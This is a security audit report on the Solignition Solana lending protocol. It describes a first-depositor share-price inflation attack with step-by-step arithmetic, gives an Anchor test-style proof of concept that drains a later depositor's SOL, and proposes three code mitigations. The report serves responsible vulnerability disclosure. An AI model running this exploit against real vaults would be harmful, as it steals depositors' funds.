# Security Audit Report: Solignition Protocol

**Auditor:** Navis Yu  
**Date:** 2026-02-10  
**Repository:** https://github.com/Peacanduck/solignition  
**Commit:** latest (main branch)  

---

## Executive Summary

One **CRITICAL** severity vulnerability was identified in the Solignition lending protocol that allows the first depositor to manipulate share prices and steal funds from subsequent depositors.

---

## Finding #1: First Depositor Inflation Attack

### Severity: 🔴 **CRITICAL**

### Description

The protocol's share calculation mechanism is vulnerable to a classic "first depositor attack" (also known as ERC4626 inflation attack). An attacker can become the first depositor with a minimal amount (1 lamport), then directly transfer funds to the vault PDA to artificially inflate the share price, causing subsequent depositors to receive significantly fewer shares than they should.

### Affected Code

**File:** `anchor/programs/solignition/src/lib.rs`

```rust
fn calculate_shares_for_deposit(config: &ProtocolConfig, amount: u64, vault_lamports: u64) -> u64 {
    if config.total_shares == 0 {
        return amount;  // ← Vulnerable: First deposit 1:1 ratio
    }
    
    let share_price = calculate_share_price(config, vault_lamports);
    
    // shares = (amount * 10^9) / share_price
    ((amount as u128)
        .checked_mul(1_000_000_000)
        .unwrap()
        .checked_div(share_price)
        .unwrap()) as u64
}

fn calculate_share_price(config: &ProtocolConfig, vault_lamports: u64) -> u128 {
    if config.total_shares == 0 {
        return 1_000_000_000;
    }
    let total_assets = vault_lamports + config.total_loans_outstanding;  // ← Uses vault_lamports directly
    
    (total_assets as u128)
        .checked_mul(1_000_000_000)
        .unwrap()
        .checked_div(config.total_shares as u128)
        .unwrap()
}
```

### Attack Scenario

**Step 1:** Alice deposits 1 lamport
```
- Alice calls deposit(1 lamport)
- Alice receives 1 share
- total_shares = 1
- vault_lamports = 1
- share_price = 1,000,000,000 (1:1 ratio with 9 decimals)
```

**Step 2:** Alice directly transfers 1000 SOL to vault PDA
```
- Alice sends 1,000 * 10^9 lamports directly to vault PDA (not via deposit())
- vault_lamports = 1 + 1,000,000,000,000 = 1,000,000,000,001
- total_shares = 1 (unchanged!)
- share_price = (1,000,000,000,001 * 10^9) / 1 ≈ 1,000,000,000,001 * 10^9
```

**Step 3:** Bob deposits 500 SOL
```
- Bob calls deposit(500 * 10^9 lamports)
- Shares to mint = (500,000,000,000 * 10^9) / (1,000,000,000,001 * 10^9) 
                 ≈ 0.499999... 
                 = 0 shares (rounded down!)
- Bob receives 0 shares but transferred 500 SOL to vault!
```

**Step 4:** Alice withdraws
```
- Alice owns 1 share out of 1 total share (100%)
- Alice can withdraw all vault assets including Bob's 500 SOL
- Bob loses everything
```

### Impact

- **Fund Loss:** Subsequent depositors lose funds to the first depositor
- **Liquidity Manipulation:** Share prices can be artificially inflated
- **Protocol Reputation:** Critical vulnerability in core mechanics
- **Exploitability:** Easy to exploit, requires minimal capital (1 lamport + gas)

### Proof of Concept

**Test Case (TypeScript/Anchor):**

```typescript
it("First Depositor Inflation Attack", async () => {
  // 1. Alice deposits 1 lamport
  await program.methods
    .deposit(new BN(1))
    .accounts({ depositor: alice.publicKey, ... })
    .signers([alice])
    .rpc();

  // 2. Alice directly transfers 1000 SOL to vault PDA
  const vaultPDA = PublicKey.findProgramAddressSync(
    [Buffer.from("vault")],
    program.programId
  )[0];
  
  await provider.connection.requestAirdrop(alice.publicKey, 1000 * LAMPORTS_PER_SOL);
  
  const tx = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: alice.publicKey,
      toPubkey: vaultPDA,
      lamports: 1000 * LAMPORTS_PER_SOL,
    })
  );
  await provider.sendAndConfirm(tx, [alice]);

  // 3. Bob deposits 500 SOL
  const bobBefore = await provider.connection.getBalance(bob.publicKey);
  
  await program.methods
    .deposit(new BN(500 * LAMPORTS_PER_SOL))
    .accounts({ depositor: bob.publicKey, ... })
    .signers([bob])
    .rpc();

  // 4. Verify Bob received 0 or negligible shares
  const bobRecord = await program.account.depositorRecord.fetch(...);
  console.log("Bob's shares:", bobRecord.shareAmount.toString());
  // Expected: 0 or very small number

  // 5. Alice withdraws all
  await program.methods
    .withdraw(new BN(1)) // Withdraw 1 share
    .accounts({ depositor: alice.publicKey, ... })
    .signers([alice])
    .rpc();

  const aliceAfter = await provider.connection.getBalance(alice.publicKey);
  // Alice receives ~1500 SOL (her 1000 + Bob's 500)
});
```

### Root Cause

1. **No Minimum First Deposit:** First depositor can mint shares with as little as 1 lamport
2. **Direct PDA Transfers:** Vault PDA can receive lamports without minting shares
3. **Share Price Manipulation:** `calculate_share_price()` uses `vault_lamports` which includes direct transfers

### Recommended Fix

**Option 1: Minimum First Deposit (Simple)**

```rust
fn calculate_shares_for_deposit(config: &ProtocolConfig, amount: u64, vault_lamports: u64) -> u64 {
    if config.total_shares == 0 {
        // Require minimum first deposit of 0.01 SOL to prevent attacks
        require!(amount >= 10_000_000, ErrorCode::MinimumDepositNotMet);
        return amount;
    }
    
    let share_price = calculate_share_price(config, vault_lamports);
    
    ((amount as u128)
        .checked_mul(1_000_000_000)
        .unwrap()
        .checked_div(share_price)
        .unwrap()) as u64
}
```

**Option 2: Dead Shares (Recommended for DeFi protocols)**

```rust
pub fn initialize(ctx: Context<Initialize>, ...) -> Result<()> {
    let config = &mut ctx.accounts.protocol_config;
    // ... existing initialization ...
    
    // Mint 1000 dead shares to prevent inflation attack
    config.total_shares = 1000;
    config.dead_shares = 1000;  // Track locked shares
    
    // Transfer 1000 lamports to vault as initial liquidity
    let ix = system_instruction::transfer(
        &ctx.accounts.admin.key(),
        &ctx.accounts.vault.key(),
        1000,
    );
    invoke(&ix, ...)?;
    
    Ok(())
}

fn calculate_shares_for_deposit(config: &ProtocolConfig, amount: u64, vault_lamports: u64) -> u64 {
    let circulating_shares = config.total_shares;  // Already includes dead shares
    
    if circulating_shares == 0 {
        return amount;  // Should never happen now
    }
    
    let share_price = calculate_share_price(config, vault_lamports);
    
    ((amount as u128)
        .checked_mul(1_000_000_000)
        .unwrap()
        .checked_div(share_price)
        .unwrap()) as u64
}
```

**Option 3: Virtual Offset (Most Robust)**

```rust
const VIRTUAL_SHARES: u128 = 10_000_000_000;  // 10 SOL worth
const VIRTUAL_ASSETS: u128 = 10_000_000_000;

fn calculate_share_price(config: &ProtocolConfig, vault_lamports: u64) -> u128 {
    let total_shares = (config.total_shares as u128) + VIRTUAL_SHARES;
    let total_assets = (vault_lamports as u128) 
                     + (config.total_loans_outstanding as u128) 
                     + VIRTUAL_ASSETS;
    
    (total_assets * 1_000_000_000) / total_shares
}
```

### References

- [ERC4626 Inflation Attack](https://blog.openzeppelin.com/a-novel-defense-against-erc4626-inflation-attacks)
- [Solana Vault Security Best Practices](https://www.sec3.dev/blog/solana-defi-security)

---

## Additional Observations

### Medium Severity Issues

1. **`distribute_yield` Function is Unused**
   - The `total_yield_distributed` field is incremented but never used in calculations
   - Share price only depends on `vault_lamports + total_loans_outstanding`
   - Recommendation: Remove unused code or integrate into share price calculation

2. **No Pause Mechanism for Emergency**
   - While `is_paused` flag exists, there's no admin function to toggle it
   - Recommendation: Add `pause()` and `unpause()` admin functions

3. **Missing Reentrancy Guards**
   - While Solana's runtime prevents classic reentrancy, CPI-based attacks are possible
   - Recommendation: Use state flags to prevent nested calls

### Low Severity Issues

1. **No Maximum Loan Duration Check**
   - Borrowers can set arbitrarily long durations
   - Recommendation: Add `MAX_LOAN_DURATION` constant

2. **Interest Calculation Precision Loss**
   - Integer division may cause rounding errors on small loans
   - Recommendation: Document minimum loan amounts

---

## Conclusion

The Solignition protocol contains a **critical vulnerability** that must be fixed before any mainnet deployment. The first depositor attack can result in complete loss of user funds and should be addressed immediately using one of the recommended mitigations.

**Timeline for Responsible Disclosure:**
1. Private disclosure to project team: Immediate
2. Public disclosure: 90 days after fix is deployed (or earlier if team confirms)

---

**Contact:**  
Email: justincnu@gmail.com  
GitHub: @justincn222
